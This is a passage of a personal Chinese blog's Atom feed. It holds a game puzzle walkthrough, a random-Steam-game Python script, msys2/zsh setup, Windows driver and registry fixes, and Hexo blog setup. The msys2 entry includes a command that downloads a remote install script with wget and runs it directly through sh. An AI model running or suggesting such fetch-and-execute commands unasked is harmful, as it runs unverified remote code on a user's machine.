<p>耶和華（英语：Jehovah，又作Yehovah 或 Yehowah），對希伯來聖經中的希伯來語：יְהֹוָה‎‎，或是四字神名（希伯來語：יהוה‎‎，YHWH）加上母音，進行拉丁化而产生的一个专有名词。原是猶太教尊奉的神名，也是基督教中的神，天主教譯作雅威。–Wikipedia</p>
</blockquote>
<h2 id="0x06_collective_unconscious">0x06 collective unconscious</h2><p>抬头见卫星 回头见人头<br><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716406822/2FE09E5A9402DF318F143467B769F56155BFE746/?pic7.jpg" alt="pic7"><br>人头背面四个标志,下面四个选项可由<em>The box</em>关墙上的画可知,分别对应Fire/Earth/Wind/Water(即四元素)<br><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716407218/D1C3BB739B180812914F83B8D49EBBB96C75518A/?pic8.jpg" alt="pic8"><br>至此即通关,开门后可见游戏设计的原画于一大堆不同语言的评论,大多数是英文.</p>
<p>–</p>
<h2 id="0x07_Final">0x07 Final</h2><p>最后与电视互动,提示”You sure want to look inside?”</p>
<p>选yes后,伴随着刺耳的声音,依次出现人脸,四面体,十字架和门外的外星人,意义不明.</p>
<h2 id="0x08">0x08</h2><p>这个游戏总的来说有一种不明觉厉的感觉,解密元素不多,满打满算也就六个,其中至少一半与”<strong>卡巴拉</strong>(Kabbalah)”有关.</p>
<p><strong>卡巴拉</strong>是一种哲学思想,起源于犹太人,后来影响了多种教派,包括基督教.但是它本身却并没有独立成为宗教.简单来说<strong>卡巴拉</strong>即解释有限的宇宙与无限的造物主之间的关系.<br><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Tree_of_life_bahir_hebrew.png" alt="pic_wiki"><br>卡巴拉的生命树阵图有10质点，22条路径，十个原质按照由上至下，由右到左的顺序分别是：王冠（Kether）,智慧（Wisdom）,理解（Understanding）,仁慈（Mercy）,严格（Severity）,美丽（Beauty）,胜利（Victory）,光辉（Spendor）,基础（Foundation）,王国（Kingdom）,最上面的点是王冠，最下面的点是王国。王冠代表的是完人的世界:超越、神的本性，王国代表的是俗人的世界:王国、物质、人。从第十个点上升到第一个点的过程，是俗人升华成完人的过程。</p>
<p>塔罗牌的起源业余<strong>卡巴拉</strong>有关,神秘学家们将塔罗22张大牌的每一张牌分别与22个希伯来字母建立了对应,正好对应<strong>卡巴拉</strong>中的22条路径.</p>
<p>对于这个游戏,我有一种”开发者想向我们传递一些哲学道理,但是恕我愚钝我没有看出来.虽然不明白是什么意思但是感觉好厉害的样子啊.”的感觉,所以游戏的评价如同<strong>collective unconscious</strong>中有且仅有的中文评价一样:画面看起来很漂亮.</p>
<h2 id="参考资料">参考资料</h2><p>Wikipedia<br>Zhihu<br>Baidu Tieba</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>今天随机到的游戏是”The Next Door”.</p>
<p><iframe src="https://store.steampowered.com/widget/447850/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>不不不,不是你想的那个意♂思,和”Boy♂Next♂Door”的那个一点关系都没有.此游戏是一个融合了宗教元素的正常向解密游戏,只是我第一次玩的时候直白的xx画面吓得我赶紧把游戏关掉了而已.<br>]]>
    
    </summary>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[凭本事买的游戏为什么要玩]]></title>
    <link href="http://blog.qwerdf.com/2017/07/16/play-random-game/"/>
    <id>http://blog.qwerdf.com/2017/07/16/play-random-game/</id>
    <published>2017-07-16T00:22:07.000Z</published>
    <updated>2018-03-30T19:00:35.979Z</updated>
    <content type="html"><![CDATA[<p>当今年steam夏季促销完成后,随着身体的一阵抖动,顿时感觉索然无味了起来.</p>
<p>看着库里各种慈善包/免费领取的喜加一,想着这破博客的更新频率,我决定搞一个一个喜加一小游戏的游玩记录,玩玩各种”多半差评”的神奇游戏.</p>
<p><del>使用<a href="https://steamdb.info/calculator/" target="_blank" rel="external">steamdb.info</a>页面下方提供的”i’m feeling lucky”来实现.</del><br><a id="more"></a><br>然而并不行,随机的只是在几个游戏中随机…</p>
<p>访问<a href="https://store.steampowered.com/dynamicstore/userdata/" target="_blank" rel="external">steam</a>获得账户游戏信息.其中rgOwnedApps即为所拥有游戏.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice <span class="keyword">as</span> roll</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> shell</span><br><span class="line">rgOwnedApps = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">60</span>,.....,<span class="number">635780</span>]</span><br><span class="line">shell(<span class="string">'"C:/Program Files/Internet Explorer/iexplore.exe" \"steam://run/'</span>+str(roll(rgOwnedApps))+<span class="string">'\"'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>当今年steam夏季促销完成后,随着身体的一阵抖动,顿时感觉索然无味了起来.</p>
<p>看着库里各种慈善包/免费领取的喜加一,想着这破博客的更新频率,我决定搞一个一个喜加一小游戏的游玩记录,玩玩各种”多半差评”的神奇游戏.</p>
<p><del>使用<a href="https://steamdb.info/calculator/">steamdb.info</a>页面下方提供的”i’m feeling lucky”来实现.</del><br>]]>
    
    </summary>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows下好用的shell--msys2]]></title>
    <link href="http://blog.qwerdf.com/2017/07/15/configure-msys2/"/>
    <id>http://blog.qwerdf.com/2017/07/15/configure-msys2/</id>
    <published>2017-07-15T13:40:26.000Z</published>
    <updated>2018-03-30T18:59:10.389Z</updated>
    <content type="html"><![CDATA[<p>对于我这个linux伪粉来说,Windows下的cmd真的难用.在对比了多种同类型的工具(Gow,cygwin等)后,我选择了msys2.</p>
<h2 id="安装">安装</h2><p>国内镜像<br><a href="http://mirrors.ustc.edu.cn/msys2/distrib/" target="_blank" rel="external">http://mirrors.ustc.edu.cn/msys2/distrib/</a><br>官方源<br><a href="http://repo.msys2.org/distrib/" target="_blank" rel="external">http://repo.msys2.org/distrib/</a><br><a id="more"></a></p>
<h2 id="配置镜像以加速下载安装">配置镜像以加速下载安装</h2><p>于 /etc/pacman.d/mirrorlist.mingw32 文件开头添加：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server = <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/msys2/mingw/i686</span></span><br></pre></td></tr></table></figure></p>
<p>于 /etc/pacman.d/mirrorlist.mingw64 文件开头添加：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server = <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/msys2/mingw/x86_64</span></span><br></pre></td></tr></table></figure></p>
<p>于/etc/pacman.d/mirrorlist.msys 文件开头添加：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server = http://mirrors.ustc.edu.cn/msys2/msys/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure></p>
<h2 id="更新组件">更新组件</h2><p>msys2使用pacman来管理包,即<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pacman</span> -Syu</span><br></pre></td></tr></table></figure></p>
<p>第一次更新需要杀掉终端,重启后再更新一次</p>
<p>更新完成后使用pacman -Scc清理空间</p>
<h2 id="替换默认bash为zsh">替换默认bash为zsh</h2><p>安装zsh<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pacman</span> -S zsh</span><br></pre></td></tr></table></figure></p>
<p>配置<a href="http://ohmyz.sh" target="_blank" rel="external">Oh My Zsh</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure>
<p>替换默认bash为zsh<br>于mingw32.ini/mingw64.ini/msys2.ini末尾添加<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constant">SHELL</span>=<span class="regexp">/usr/bin</span><span class="regexp">/zsh</span></span><br></pre></td></tr></table></figure></p>
<h2 id="其他杂项">其他杂项</h2><p>于.bashrc内取消大部分注释<br>于pacman.conf内添加ILoveCandy😄</p>
<h2 id="参考链接">参考链接</h2><p><a href="https://wiki.archlinux.org/index.php/Pacman" target="_blank" rel="external">https://wiki.archlinux.org/index.php/Pacman</a><br><a href="https://superuser.com/questions/961699/change-default-shell-on-msys2" target="_blank" rel="external">https://superuser.com/questions/961699/change-default-shell-on-msys2</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>对于我这个linux伪粉来说,Windows下的cmd真的难用.在对比了多种同类型的工具(Gow,cygwin等)后,我选择了msys2.</p>
<h2 id="安装">安装</h2><p>国内镜像<br><a href="http://mirrors.ustc.edu.cn/msys2/distrib/">http://mirrors.ustc.edu.cn/msys2/distrib/</a><br>官方源<br><a href="http://repo.msys2.org/distrib/">http://repo.msys2.org/distrib/</a><br>]]>
    
    </summary>
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何在cfosspeed隱藏圖標+鼠標穿透的情況下調出菜單進行調整]]></title>
    <link href="http://blog.qwerdf.com/2017/03/30/cFosSpeed_Menu/"/>
    <id>http://blog.qwerdf.com/2017/03/30/cFosSpeed_Menu/</id>
    <published>2017-03-30T14:56:10.000Z</published>
    <updated>2017-07-17T17:54:23.485Z</updated>
    <content type="html"><![CDATA[<p>编辑文件<br>C:\Users\<username>\AppData\Local\cFos\cFosSpeed\user_data.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[All]</span><br><span class="line">ts_advice=<span class="number">10.22</span></span><br><span class="line">autoarrange=<span class="number">3</span></span><br><span class="line">hide_on_fullscreen=<span class="number">0</span></span><br><span class="line">click_through=<span class="number">1</span>   //鼠标穿透</span><br><span class="line">trayicon=<span class="number">0</span>    //托盘图标</span><br><span class="line">...</span><br></pre></td></tr></table></figure></username></p>
<p>或者直接带参数运行,调出菜单<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cfosspeed<span class="class">.exe</span> -context_menu</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>编辑文件<br>C:\Users\<username>\AppData\Local\cFos\cFosSpeed\user_data.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><p]]>
    </summary>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[vs2017 rc 初体验]]></title>
    <link href="http://blog.qwerdf.com/2016/12/04/vs2017-rc-preview/"/>
    <id>http://blog.qwerdf.com/2016/12/04/vs2017-rc-preview/</id>
    <published>2016-12-04T11:07:28.000Z</published>
    <updated>2018-03-30T19:01:13.105Z</updated>
    <content type="html"><![CDATA[<p>早几日听说vs2017 Rc已经可以<a href="https://www.visualstudio.com/vs/visual-studio-2017-rc/" target="_blank" rel="external">下载</a>了，今日下载了下来玩了下。</p>
<h2 id="默认全部在线安装">默认全部在线安装</h2><p><img src="/uploads/2016-12-04_1.png" alt="一个在线安装的安装程序" title="全新的在线安装的安装程序"><br>我已经开始了下载，并准备做好去蹲坑的准备,结果我刚拿上了纸就听到了下载完成的提示声音。<br><img src="/uploads/2016-12-04_2.png" alt="837 kb" title="大小仅仅有837 kb"><br><a id="more"></a></p>
<h2 id="新的安装界面和选择组件方式">新的安装界面和选择组件方式</h2><p>感觉vs2017外在改变最大的就是这个安装界面了，曾经有这么一个说法：vs是非常庞大(亦或者是臃肿?)的，不仅仅是他的功能强大，还有他强大的占用空间。有时候我们仅仅需要使用其来进行一个方向的开发，但是vs其默认安装总是安装一些我们一般并不需要的功能。这一点在2017中有了极大改善。新版安装界面比之前我用过的几个版本相比简直就是两个软件，改变了在我眼中vs一贯臃肿的看法。<br><img src="/uploads/2016-12-04_6.png" alt="默认的分组" title="默认的分组"><br><img src="/uploads/2016-12-04_4.png" alt="安装时下载的界面与速度" title="安装中..."><br>速度还是能看的，至少比android studio好多了，我安装的时候能把带宽跑满。</p>
<h2 id="离线安装">离线安装</h2><p>官方提供了下载离线安装包的<a href="https://www.visualstudio.com/zh-CN/news/releasenotes/vs2017-relnotes#a-idwillow-anew-installation-experience" target="_blank" rel="external">方法</a><br>  <figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">vs_enterprise</span><span class="string">.</span><span class="comment">exe</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">layout</span> <span class="comment">c:\download_path\</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">lang</span> <span class="comment">zh</span><span class="literal">-</span><span class="comment">CN</span></span><br></pre></td></tr></table></figure></p>
<p>其中若不填写路径，则下载到当前路径。</p>
<h2 id="还保留有windows_XP_support_for_c艹">还保留有windows XP support for c艹</h2><p><img src="/uploads/2016-12-04_5.png" alt="windows XP support for c++"><br>虽然对于xp，微软已经停止了发布补丁，但是我们仍然可以在最新版的vs2017中看到微软为了兼容旧版本所保修的组件。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>早几日听说vs2017 Rc已经可以<a href="https://www.visualstudio.com/vs/visual-studio-2017-rc/">下载</a>了，今日下载了下来玩了下。</p>
<h2 id="默认全部在线安装">默认全部在线安装</h2><p><img src="/uploads/2016-12-04_1.png" alt="一个在线安装的安装程序" title="全新的在线安装的安装程序"><br>我已经开始了下载，并准备做好去蹲坑的准备,结果我刚拿上了纸就听到了下载完成的提示声音。<br><img src="/uploads/2016-12-04_2.png" alt="837 kb" title="大小仅仅有837 kb"><br>]]>
    
    </summary>
    
      <category term="VisualStudio" scheme="http://blog.qwerdf.com/tags/VisualStudio/"/>
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[修复由于WAN_Miniport导致的网络问题]]></title>
    <link href="http://blog.qwerdf.com/2016/02/04/WAN-miniport/"/>
    <id>http://blog.qwerdf.com/2016/02/04/WAN-miniport/</id>
    <published>2016-02-04T04:58:09.000Z</published>
    <updated>2018-03-30T19:01:22.106Z</updated>
    <content type="html"><![CDATA[<p>在硬件管理器中出现了’WAN_Miniport（*）’，这六个理论上应该是 <del>隐藏的，</del> 没有错误的，但是有时候就会莫名其妙的出现好几个 WAN Miniport (IPv6 L2TP Network_Monitor PPPOE PPTP SSTP)，出现的原因很多，不过我见过的最多的就是xxx加速器/校园宽带客户端引起的。</p>
<p>修复方法:<br>1.打开设备管理器，右键WAN_Miniport，选择更新驱动。<br>2.选择下面那个”浏览我的计算机xxxxxxx”<br>3.点下面那个”兼容设备”<br>4.勾掉”显示xxx”的复选框<br>5.左边选”Microsoft”，右边选”Microsoft KM-TEST Loopback Adapter“或者”Generic Mobile Broadband Adapter“<br>6.确定，完成。然后右键WAN_Miniport，卸载。<br>7.重复以上步骤，直到将所有WAN_Miniport都做一遍。<br>8.重启电脑。<br>9.打开设备管理器，扫描硬件。<br>10.完成</p>
<p>或者</p>
<p><a href="http://download.microsoft.com/download/D/9/2/D923C013-E9AD-4BBE-A52C-AC1F16685036/MicrosoftFixit20114.mini.diagcab" target="_blank" rel="external">下载我</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在硬件管理器中出现了’WAN_Miniport（*）’，这六个理论上应该是 <del>隐藏的，</del> 没有错误的，但是有时候就会莫名其妙的出现好几个 WAN Miniport (IPv6 L2TP Network_Monitor PPPOE PPTP SSTP)，出现]]>
    </summary>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[win10更新工具]]></title>
    <link href="http://blog.qwerdf.com/2016/01/13/win10-update-tools/"/>
    <id>http://blog.qwerdf.com/2016/01/13/win10-update-tools/</id>
    <published>2016-01-13T10:53:20.000Z</published>
    <updated>2018-03-30T19:01:39.521Z</updated>
    <content type="html"><![CDATA[<p>一次偶然发现使得我找到了<a href="http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab" target="_blank" rel="external">wushowhide.diagcab</a>这个工具，他可以使得win10实现win7/8/8.1的wuapp.exe的隐藏更新的功能，此外也可以显示可选更新。win10那反人类的自动更新就不说什么了，更可气的是可选更新的驱动也不能自己安装更新，所以我每次都是查看可选更新后在设备管理器中找半天，然后右键更新驱动。而且有些设备更新驱动前后名字会变！这让我更菊酸乳疼了…</p>
<p>现在我发现了”<a href="http://forum.ru-board.com/topic.cgi?forum=5&amp;topic=48142#2" target="_blank" rel="external">Windows Update MiniTool</a>”……可以方便的安装可选补丁了……还有其他一些对于更新的功能可用，比如设置自动更新方式(手动/自动/关闭等)……</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>一次偶然发现使得我找到了<a href="http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab" target="_blank]]>
    </summary>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[修复Airplane Mode Hid设备异常]]></title>
    <link href="http://blog.qwerdf.com/2015/12/05/fix-insyde-airplane/"/>
    <id>http://blog.qwerdf.com/2015/12/05/fix-insyde-airplane/</id>
    <published>2015-12-04T20:23:10.000Z</published>
    <updated>2018-03-30T19:07:29.682Z</updated>
    <content type="html"><![CDATA[<p>设备管理器中Insyde Airplane Mode HID Mini-Driver有感叹号，硬件id为ACPI\VEN_PNP&amp;DEV_C000</p>
<p>在<a href="http://answers.microsoft.com/ru-ru/windows/forum/windows8_1-hardware/%D1%81%D0%BE%D0%B2%D0%BC%D0%B5%D1%81%D1%82%D0%B8/7812d6a2-1cc6-4912-8344-8635b5356983?auth=1" target="_blank" rel="external">这里</a>找到解决问题的方案。</p>
<p>导入注册表<br>    <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">;fix error code 10 (insyde airplane mode hid mini-driver) </span><br><span class="line"></span><br><span class="line"><span class="special">[</span>HKEY_LOCAL_MACHINE<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\AirplaneModeHid</span><span class="command">\Parameters</span><span class="special">]</span></span><br><span class="line">"ECRAMBASE"=dword:ff700100</span><br></pre></td></tr></table></figure></p>
<p>仔细看了看应该是这个驱动的安装程序的锅…</p>
<p>此文章基于以下驱动版本完成:1.4.0.3</p>
<p>最新更新的1.4.0.4(签名日期2017-01-19)并未解决这个bug</p>
<p><em>2018-03-31更新</em><br>1.4.0.8(签名日期2017-06-28)已解决此问题 😏</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>设备管理器中Insyde Airplane Mode HID Mini-Driver有感叹号，硬件id为ACPI\VEN_PNP&amp;DEV_C000</p>
<p>在<a href="http://answers.microsoft.com/ru-ru/windows]]>
    </summary>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[搭了个博客]]></title>
    <link href="http://blog.qwerdf.com/2015/11/18/hexo-blog/"/>
    <id>http://blog.qwerdf.com/2015/11/18/hexo-blog/</id>
    <published>2015-11-17T20:23:10.000Z</published>
    <updated>2018-03-30T19:13:14.761Z</updated>
    <content type="html"><![CDATA[<p>简单说一说我是怎么搭建这个博客的吧<br>由于hexo是基于node.js的，所以需要先安装node.js<br>由于我是架设在github.io上的，所以我们需要git(还支持heroku/rsync/openshift)</p>
<h2 id="安装node-js">安装node.js</h2><pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/joyent/node.git</span><br><span class="line">git checkout v0.<span class="number">12.7</span>-release</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure></span>
</code></pre><p>若提示命令不存在，则<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">where</span> node</span><br><span class="line">ln <span class="operator">-s</span> 原位置 错误提示的位置</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<h2 id="hexo的安装">hexo的安装</h2><p>新建了个目录<br>./blog/<br>在目录中<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br><span class="line">hexo init</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></p>
<p>这时访问<em><a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a></em>应该就可以看到你的博客了</p>
<h2 id="github的推送设置">github的推送设置</h2><p>首先安装组件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git</span><br></pre></td></tr></table></figure></p>
<p>然后设置git仓库信息<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line"><span class="attribute">type</span>: git</span><br><span class="line"><span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:<span class="attribute">XXX</span>:XXX.github.io.git</span><br><span class="line"><span class="attribute">branch</span>: master</span><br><span class="line"><span class="attribute">message</span>: update</span><br></pre></td></tr></table></figure></p>
<p>这样就可以用<strong>hexo d</strong>来推送到github了(其实本质就是<!--2018-03-31修改--> <del>推送./public/的所有文件</del><strong>复制./public/的文件到./.deploy_git/并推送</strong>到github)</p>
<h2 id="域名绑定:">域名绑定:</h2><p>暂时是直接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> blog.qwerdf.com &gt;./blog/public/CNAME</span><br></pre></td></tr></table></figure></p>
<p>然后设置A记录到github</p>
<h2 id="平时怎么用?">平时怎么用?</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"标题"</span></span><br><span class="line">vim ./blog/<span class="built_in">source</span>/_posts/标题.md</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<h2 id="常用hexo命令">常用hexo命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo s --debug</span><br><span class="line">hexo clean&amp;&amp;hexo g&amp;&amp;hexo g&amp;&amp;hexo d</span><br></pre></td></tr></table></figure>
<p>使用两次<strong>hexo g</strong>是因为有时生成的主页<a href="https://github.com/iissnan/hexo-theme-next/issues/482" target="_blank" rel="external">有问题</a>,首页仅显示一篇文章。</p>
<p>最后表示终于<strong>有时间</strong>来干这事了</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>简单说一说我是怎么搭建这个博客的吧<br>由于hexo是基于node.js的，所以需要先安装node.js<br>由于我是架设在github.io上的，所以我们需要git(还支持heroku/rsync/openshift)</p>
<h2 id="安装node-js">安装node.js</h2><pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/joyent/node.git</span><br><span class="line">git checkout v0.<span class="number">12.7</span>-release</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure></span>
</code></pre><p>若提示命令不存在，则<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">where</span> node</span><br><span class="line">ln <span class="operator">-s</span> 原位置 错误提示的位置</span><br></pre></td></tr></table></figure></p>]]>
    
    </summary>
    
      <category term="blog" scheme="http://blog.qwerdf.com/tags/blog/"/>
    
  </entry>
  
</feed>
